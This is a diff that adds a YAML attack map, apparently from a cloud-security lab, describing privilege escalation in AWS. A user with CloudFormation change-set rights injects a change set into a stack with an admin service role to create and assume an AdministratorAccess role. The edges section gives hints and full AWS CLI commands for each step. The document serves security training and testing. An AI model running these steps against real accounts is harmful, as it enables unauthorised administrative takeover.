@@ -1,0 +1,82 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-cloudformation-005-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has cloudformation:CreateChangeSet and cloudformation:ExecuteChangeSet
+        permissions scoped to all resources (*), and can target any CloudFormation stack
+        in the account.
+
+    - id: target-stack
+      label: "Target Stack"
+      type: resource
+      subType: cloudformation-stack
+      arn: "arn:aws:cloudformation:{region}:{account_id}:stack/pl-prod-cloudformation-005-to-admin-target-stack/*"
+      description: >
+        This CloudFormation stack has an admin service role (pl-prod-cloudformation-005-to-admin-stack-role)
+        attached. When a change set is executed against this stack, all resource operations
+        are performed under that service role — regardless of the caller's own permissions.
+        By injecting a malicious change set, you can have the stack create any IAM resource
+        the service role is permitted to create.
+
+    - id: escalated-role
+      label: "Escalated Admin Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-cloudformation-005-to-admin-escalated-role"
+      description: >
+        This IAM role is created by the demo attack script via change set execution. It has
+        AdministratorAccess attached and trusts the starting user, granting full administrative
+        access to the AWS account.
+
+  edges:
+    - from: starting-principal
+      to: target-stack
+      label: "cloudformation:CreateChangeSet"
+      description: >
+        Create a malicious change set against the target stack. The change set template
+        adds a new IAM role with AdministratorAccess to the stack. The change set itself
+        is harmless until executed.
+      hints:
+        - "You can create and execute change sets against CloudFormation stacks."
+        - "Look for stacks that have a privileged service role attached — the change set will execute under that role's permissions."
+        - "Browse to https://pathfinding.cloud/paths/cloudformation-005 for technique details."
+      commands:
+        - description: "Discover existing stacks and their service roles"
+          command: "aws cloudformation describe-stacks --query 'Stacks[*].{Name:StackName,Role:RoleARN}'"
+        - description: "Create a change set that adds a new admin IAM role to the stack"
+          command: "aws cloudformation create-change-set --stack-name pl-prod-cloudformation-005-to-admin-target-stack --change-set-name escalation-changeset --template-body file://malicious-template.json --capabilities CAPABILITY_NAMED_IAM"
+        - description: "Wait for the change set to be ready"
+          command: "aws cloudformation wait change-set-create-complete --stack-name pl-prod-cloudformation-005-to-admin-target-stack --change-set-name escalation-changeset"
+
+    - from: target-stack
+      to: escalated-role
+      label: "cloudformation:ExecuteChangeSet"
+      description: >
+        Execute the change set. CloudFormation uses the stack's admin service role to
+        perform all operations defined in the change set, including creating the new IAM
+        role with AdministratorAccess — bypassing the caller's own limited permissions.
+      hints:
+        - "Describe the stack to discover its service role: aws cloudformation describe-stacks."
+        - "Create a change set that adds a new IAM role with AdministratorAccess to the stack template."
+        - "Execute the change set — CloudFormation will use the stack's admin service role to create the role."
+      commands:
+        - description: "Execute the change set using the stack's privileged service role"
+          command: "aws cloudformation execute-change-set --stack-name pl-prod-cloudformation-005-to-admin-target-stack --change-set-name escalation-changeset"
+        - description: "Wait for the stack update to complete"
+          command: "aws cloudformation wait stack-update-complete --stack-name pl-prod-cloudformation-005-to-admin-target-stack"
+        - description: "Assume the newly created escalated role"
+          command: "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-cloudformation-005-to-admin-escalated-role --role-session-name escalation-session"
+        - description: "Verify administrator access"
+          command: "aws iam list-users"
